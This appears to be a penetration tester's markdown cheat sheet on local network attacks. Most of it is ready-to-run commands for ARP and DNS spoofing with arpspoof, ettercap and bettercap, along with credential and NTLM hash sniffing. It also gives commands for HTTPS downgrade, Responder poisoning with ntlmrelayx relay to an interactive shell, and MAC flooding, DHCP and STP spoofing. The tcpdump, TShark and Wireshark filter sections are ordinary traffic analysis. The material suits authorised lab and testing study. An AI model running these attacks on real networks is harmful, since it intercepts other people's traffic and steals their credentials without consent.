# Network Attacks

## Table of Contents
- [[#ARP Spoofing/Poisoning|ARP Spoofing/Poisoning]]
- [[#DNS Spoofing|DNS Spoofing]]
- [[#tcpdump|tcpdump]]
- [[#TShark|TShark]]
- [[#Wireshark|Wireshark]]
- [[#Responder (Network Level)|Responder (Network Level)]]
- [[#Bettercap|Bettercap]]
- [[#MAC Flooding|MAC Flooding]]
- [[#DHCP Spoofing|DHCP Spoofing]]
- [[#STP Spoofing|STP Spoofing]]
- [[#Related Notes|Related Notes]]

---

## ARP Spoofing/Poisoning

ARP spoofing tricks devices on a local network into sending traffic through your machine (MITM).

### How It Works

Send forged ARP replies mapping the gateway's IP to your MAC address, and the target's IP to your MAC. Traffic between them flows through you.

### Arpspoof (dsniff suite)

```bash
# Install dsniff
sudo apt install dsniff

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo sysctl net.ipv4.ip_forward=1

# ARP spoof the target (tell target you are the gateway)
sudo arpspoof -i eth0 -t 10.10.14.100 10.10.14.1

# ARP spoof the gateway (tell gateway you are the target)
sudo arpspoof -i eth0 -t 10.10.14.1 10.10.14.100

# Or run both in one terminal
sudo arpspoof -i eth0 -t 10.10.14.100 10.10.14.1 & sudo arpspoof -i eth0 -t 10.10.14.1 10.10.14.100
```

**Common usage:**
```bash
# 1. Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# 2. Start ARP spoofing (both directions)
sudo arpspoof -i eth0 -t 10.10.14.100 10.10.14.1 &
sudo arpspoof -i eth0 -t 10.10.14.1 10.10.14.100 &

# 3. Sniff traffic (e.g., with tcpdump or Wireshark)

# 4. Kill arpspoof when done (fg + Ctrl+C)
```

### Ettercap

```bash
# Text-based ARP poisoning
sudo ettercap -T -M arp:remote /10.10.14.1// /10.10.14.100//

# With sniffing filter for passwords (very verbose)
sudo ettercap -T -M arp:remote /10.10.14.1// /10.10.14.100// -q

# Log to file
sudo ettercap -T -M arp:remote /10.10.14.1// /10.10.14.100// -w capture.pcap

# GUI mode
sudo ettercap -G

# Scan network hosts first
ettercap -T -M arp /10.10.14.1/ //
```

| Flag | Description |
|------|-------------|
| `-T` | Text mode |
| `-M` | MITM method |
| `-q` | Quiet (less output) |
| `-w` | Write pcap |
| `-L` | Log file |
| `-i` | Interface |
| `-G` | GUI mode |

### Bettercap (Modern Alternative)

```bash
# Start bettercap
sudo bettercap -iface eth0

# In bettercap shell:
# Set ARP spoofing targets
set arp.spoof.targets 10.10.14.100

# Start ARP spoofing
arp.spoof on

# Enable HTTP sniffing
net.sniff on

# Enable HTTPS downgrade
set https.proxy.script /path/to/hstshijack.js
https.proxy on

# Full MITM
net.probe on
arp.spoof on
net.sniff on
```

**Bettercap one-liner:**
```bash
sudo bettercap -eval "set arp.spoof.targets 10.10.14.100; arp.spoof on; net.sniff on"
```

### Bettercap Modules

```bash
# List all modules
help

# Useful modules for MITM
# arp.spoof     — ARP spoofing
# net.sniff     — Packet sniffing
# http.proxy    — HTTP proxy
# https.proxy   — HTTPS proxy
# dns.spoof     — DNS spoofing
# net.probe     — Network probing
```

---

## DNS Spoofing

Intercept DNS requests and respond with a malicious IP.

### Ettercap DNS Spoof

```bash
# Edit the ettercap DNS file
sudo vim /etc/ettercap/etter.dns

# Add entries like:
*.example.com A 10.10.14.3
www.example.com A 10.10.14.3

# Start ARP spoof + DNS spoof
sudo ettercap -T -M arp:remote -P dns_spoof /10.10.14.1// /10.10.14.100//
```

### Bettercap DNS Spoof

```bash
# In bettercap shell
set dns.spoof.domains *.example.com,myapp.internal.com
set dns.spoof.address 10.10.14.3
dns.spoof on

# Combine with ARP spoof
arp.spoof on
dns.spoof on
net.sniff on
```

### Custom DNS Spoof with dnsspoof

```bash
# From dsniff suite
echo "10.10.14.3 *.example.com" > hosts.txt
echo "10.10.14.3 www.target.com" >> hosts.txt

# Start DNS spoof
sudo dnsspoof -i eth0 -f hosts.txt

# Combine with ARP spoof
sudo arpspoof -i eth0 -t 10.10.14.100 10.10.14.1 &
sudo dnsspoof -i eth0 -f hosts.txt
```

---

## tcpdump

### Basic Syntax

```bash
tcpdump -i eth0                          # Listen on interface
tcpdump -i eth0 -n                       # Don't resolve DNS
tcpdump -i eth0 -nn                      # Don't resolve port names either
tcpdump -i eth0 -X                       # Hex + ASCII output
tcpdump -i eth0 -A                       # ASCII only (good for HTTP)
tcpdump -i eth0 -w capture.pcap         # Write to file
tcpdump -r capture.pcap                  # Read file
tcpdump -c 100                           # Capture 100 packets then stop
tcpdump -s 0                             # Full packet (default used to be 68 bytes)
```

### Filtering

```bash
# By host
tcpdump -i eth0 host 10.10.14.100
tcpdump -i eth0 src host 10.10.14.100
tcpdump -i eth0 dst host 10.10.14.100

# By port
tcpdump -i eth0 port 80
tcpdump -i eth0 port 443
tcpdump -i eth0 portrange 1-1024

# By protocol
tcpdump -i eth0 tcp
tcpdump -i eth0 udp
tcpdump -i eth0 icmp
tcpdump -i eth0 arp

# By network
tcpdump -i eth0 net 10.10.14.0/24

# Common filters
tcpdump -i eth0 port 80 or port 443
tcpdump -i eth0 not port 22
tcpdump -i eth0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x474554)'  # HTTP GET

# Capture NTLM authentication (SMB on port 445)
tcpdump -i eth0 port 445 -X
```

### NTLM Hash Capture (from tcpdump)

```bash
# Watch for NTLMv2 hashes
sudo tcpdump -i eth0 port 445 -X | grep -A 10 "NTLMSSP"
```

---

## TShark

Command-line Wireshark (part of the wireshark-common package).

```bash
# List interfaces
tshark -D

# Capture to file
tshark -i eth0 -w capture.pcap

# Capture with display filter
tshark -i eth0 -Y "http.request"

# Read pcap
tshark -r capture.pcap

# HTTP requests
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri

# HTTP basic auth
tshark -r capture.pcap -Y "http.authbasic"

# Extract HTTP objects
tshark -r capture.pcap --export-objects "http,/tmp/extracted"

# Follow TCP stream
tshark -r capture.pcap -z follow,tcp,ascii,0

# Show IP conversations
tshark -r capture.pcap -z conv,ip

# Show endpoints
tshark -r capture.pcap -z endpoints,ip

# DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name

# NTLMSSP auth
tshark -r capture.pcap -Y "ntlmssp"
```

### Useful TShark Fields

```bash
# Extract specific fields
tshark -r capture.pcap -T fields \
  -e frame.number \
  -e ip.src \
  -e ip.dst \
  -e tcp.srcport \
  -e tcp.dstport \
  -e http.request.uri \
  -E separator=,
```

---

## Wireshark

### Filter Reference

**Capture filters (BPF syntax — set before capture):**
```text
host 10.10.14.100
port 80 or port 443
not arp
tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)
```

**Display filters (set during analysis):**
```text
# IP
ip.addr == 10.10.14.100
ip.src == 10.10.14.100
ip.dst == 10.10.14.1

# Ports
tcp.port == 80
tcp.port == 445

# HTTP
http.request
http.response
http.request.method == "POST"
http.host == "target.com"

# DNS
dns.flags.response == 0    # DNS queries
dns.qry.name contains "admin"

# SMB/NTLM
ntlmssp
ntlmssp.messagetype == 3   # NTLM authentication (type 3)

# Credentials
http.authbasic
ftp.request.command == "USER" or ftp.request.command == "PASS"

# Follow streams
Right-click → Follow → TCP Stream
```

---

## Responder (Network Level)

While primarily an [[04 - Password Attacks/4.1 Online Attacks/Online Password Attacks|online password attack]] tool, Responder operates at the network level by poisoning LLMNR, NBT-NS, and MDNS.

### Network-Level Responder

```bash
# Basic network poisoning
sudo responder -I eth0

# Analyze mode (don't poison, just display)
sudo responder -I eth0 -A

# With WPAD rogue proxy
sudo responder -I eth0 -wd

# Enable fingerprinting
sudo responder -I eth0 -F

# Disable specific services
sudo responder -I eth0 --NBTNS=off --LLMNR=off
```

### Responder + Relay

```bash
# For relay attacks, disable SMB in Responder
# /etc/responder/Responder.conf → SMB = Off, HTTP = Off

# Start ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Or get interactive shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

---

## Bettercap

Bettercap is a powerful, modular MITM framework.

### Quick Start

```bash
sudo bettercap -iface eth0
```

### Network Reconnaissance

```bash
# In bettercap shell
net.probe on                    # Discover hosts
net.show                        # Show discovered hosts
net.probe off

# Passive network recon
net.sniff on
net.sniff stats                 # Show sniffing stats
```

### ARP Spoofing

```bash
# Target a specific host
set arp.spoof.targets 10.10.14.100
arp.spoof on

# Spoof entire subnet
set arp.spoof.targets 10.10.14.0/24
arp.spoof on

# Restore ARP tables when done
arp.spoof off
```

### HTTP/HTTPS Sniffing

```bash
# HTTP
set http.proxy.port 8080
http.proxy on
net.sniff on

# HTTPS (with MITM certificate)
set https.proxy.port 8081
https.proxy on
```

### Credential Sniffing

```bash
# Sniff for credentials
net.sniff on

# HTTP auth
http.proxy on

# Show captured credentials
net.sniff.output captured.log
```

---

## MAC Flooding

Overwhelm switch's CAM table → switch falls back to hub mode (floods all ports).

```bash
# Using macof (from dsniff)
sudo macof -i eth0

# With parameters
sudo macof -i eth0 -n 10000 -s 10.10.14.3

# Using bettercap
sudo bettercap -eval "set arp.spoof.targets 10.10.14.100; arp.spoof on; net.sniff on"
```

---

## DHCP Spoofing

Rogue DHCP server to assign malicious network settings.

### Yersinia

```bash
# Yersinia DHCP attack
sudo yersinia -I eth0 -G

# Or via CLI
sudo yersinia dhcp -attack 1 -interface eth0  # DHCP starvation
```

### Metasploit DHCP Spoof

```
use auxiliary/server/dhcp
set DHCPIPSTART 10.10.14.200
set DHCPIPEND 10.10.14.250
set DNSSERVER 10.10.14.3
set ROUTER 10.10.14.1
set SRVHOST 10.10.14.3
set NETMASK 255.255.255.0
run
```

---

## STP Spoofing

Spanning Tree Protocol attacks to become root bridge.

```bash
# Using yersinia
sudo yersinia stp -attack 1   # become root bridge
```

---

## Quick Reference

### ARP Spoof Checklist

```bash
# 1. Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# 2. ARP spoof (target and gateway)
sudo arpspoof -i eth0 -t 10.10.14.100 10.10.14.1 &
sudo arpspoof -i eth0 -t 10.10.14.1 10.10.14.100 &

# 3. Sniff traffic
sudo tcpdump -i eth0 -w mitm.pcap

# 4. Clean up
kill %1 %2
# ARP tables restore automatically within ~30 seconds
```

### Bettercap All-in-One

```bash
sudo bettercap -eval "
set arp.spoof.targets 10.10.14.100;
set dns.spoof.domains *.target.com;
set dns.spoof.address 10.10.14.3;
arp.spoof on;
dns.spoof on;
net.sniff on;
http.proxy on;
"
```

---

## Related Notes

- [[04 - Password Attacks/4.1 Online Attacks/Online Password Attacks]]
- [[05 - Network Attacks/5.2 Firewall Evasion/Firewall IDS Evasion]]
- [[12 - Pivoting and Port Forwarding/Pivoting Techniques]]
- [[07 - Metasploit Framework/Metasploit Complete]]
